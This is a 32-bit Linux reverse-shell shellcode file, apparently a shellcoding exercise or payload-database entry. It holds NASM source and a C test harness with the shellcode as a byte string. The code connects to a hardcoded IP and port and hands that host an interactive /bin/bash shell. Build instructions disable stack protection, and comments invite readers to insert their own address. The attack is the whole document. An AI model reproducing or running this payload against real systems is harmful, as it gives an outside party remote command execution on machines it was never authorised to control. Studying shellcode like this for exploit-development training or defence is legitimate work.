/*
; File name: reversebash.nasm
; Author:  Jasmin Landry (@JR0ch17)
; Purpose: Shellcode that creates a reverse /bin/bash shell on port 54321 to IP address 192.168.3.119
; Shellcode length: 110 bytes
; Tested on Ubuntu 12.04.5 32-bit (x86)
; Assemble reversebash.nasm file: nasm -f elf32 -o reversebash.o reversebash.nasm -g
; Link: ld -z execstack -o reversebash reversebash.o
; Use objdump to find shellcode and copy it over to the code section of the .c file
; Compile: gcc -m32 -fno-stack-protector -z execstack reversebash.c -o reversebash2

global _start

section .text
_start:
	jmp short call_shellcode

shellcode:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	pop edx

	push 0x6
	push 0x1
	push 0x2

	mov al, 0x66
	mov bl, 0x1
	mov ecx, esp
	int 0x80

	mov esi, eax

	xor eax, eax
	push eax
	push dword [edx+2]
	push word [edx]
	push word 0x2
	mov ecx, esp
	push 0x10
	push ecx
	push esi
	mov al, 0x66
	mov bl, 0x3
	mov ecx, esp
	int 0x80

	xor ecx, ecx
	mov cl, 0x3

loop:
	dec cl
	mov al, 0x3f
	mov ebx, esi
	int 0x80

	mov esi, eax
	jnz loop

	xor eax, eax
	xor ecx, ecx
	push ecx
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f
	mov ebx, esp
	push ecx
	push ebx
	mov al, 0xb
	mov ecx, esp
	xor edx, edx
	int 0x80

call_shellcode:
	call shellcode
	port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77 ;First 2 bytes are port and last 4 are IP. Please change these bytes to reflect your environment and recompile.

*/


#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x61\x31\xc0\x31\xdb\x31\xc9\x5a\x6a\x06\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc6\x31\xc0\x50\xff\x72\x02\x66\xff\x32\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\x89\xf3\xcd\x80\x89\xc6\x75\xf4\x31\xc0\x31\xc9\x51\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x51\x53\xb0\x0b\x89\xe1\x31\xd2\xcd\x80\xe8\x9a\xff\xff\xff\xd4\x31\xc0\xa8\x03\x77"; //Again, the last 4 bytes are the IP and the 2 before those are the port.

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}